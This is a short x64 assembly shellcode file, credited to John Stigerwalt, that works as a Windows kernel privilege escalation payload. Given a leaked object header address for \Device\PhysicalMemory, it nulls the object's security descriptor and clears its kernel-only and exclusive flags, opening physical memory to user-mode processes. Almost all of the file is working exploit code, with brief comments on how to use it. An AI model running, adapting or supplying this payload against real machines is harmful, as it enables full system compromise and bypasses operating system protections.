; By John Stigerwalt
;
; Nulls out Security descriptor (offset 0x28)
; Changes bits for KernelOnlyAcces, KernelObject, ExclusiveObject (Flags at 0x1b)
;
; Details:	Running this shellcode with an address leak of a Object header "\Device\PhysicalMemory" 
; will changes permissions to NULL and allow UserLand access to the Handle. 
;
; Date: 09\12\2019
;

section .text
global start
[BITS 64]

; Save Stack
push rax
push rbx
push rcx

; Start here
xor rcx, rcx

; Must change this address or will BSOD
mov rax, qword 0xffff948f45444dd0

; Now sitting at Object_Header
sub rax, 30h
mov rbx, qword rax

;We change Flags from 16 to 10
mov [rax + 1bh], byte 10h

;We null this out. This is quick and easy, this can be changed for specific permissions as well.
mov [rax + 28h], qword rcx

; Fix the stack
pop rcx
pop rbx
pop rax

; Return
ret
